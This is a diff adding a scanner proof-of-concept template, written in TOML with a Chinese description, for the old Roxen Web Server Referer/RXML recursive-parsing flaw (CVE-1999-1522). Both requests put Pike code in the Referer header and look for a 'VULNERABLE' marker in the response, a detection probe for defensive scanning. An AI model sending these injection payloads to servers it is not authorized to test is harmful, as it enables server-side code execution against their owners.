@@ -1,0 +1,52 @@
+[info]
+author = "ave"
+description = "Roxen Web Server 1.3.11 及更早版本中 htmlparse.pike 的 <referer> 标签未对客户端输入的 Referer 头进行转义，导致 RXML 代码被递归解析。攻击者通过发送包含恶意 RXML 标签的 Referer 头的 HTTP 请求，可触发服务器端模板注入，造成信息泄露或拒绝服务。"
+id = "POC-AVE-1999-1158"
+name = "Roxen Web Server htmlparse.pike RXML Referer 递归解析 PoC"
+severity = "medium"
+tags = ["ave-1999-1158"]
+vuln_id = [
+    "CVE-1999-1522",
+    "AVE-1999-1158",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+Referer = '<pike>return("VULNERABLE");</pike>'
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["VULNERABLE"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+Referer = '<referer><pike>return("VULNERABLE");</pike></referer>'
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["VULNERABLE"]
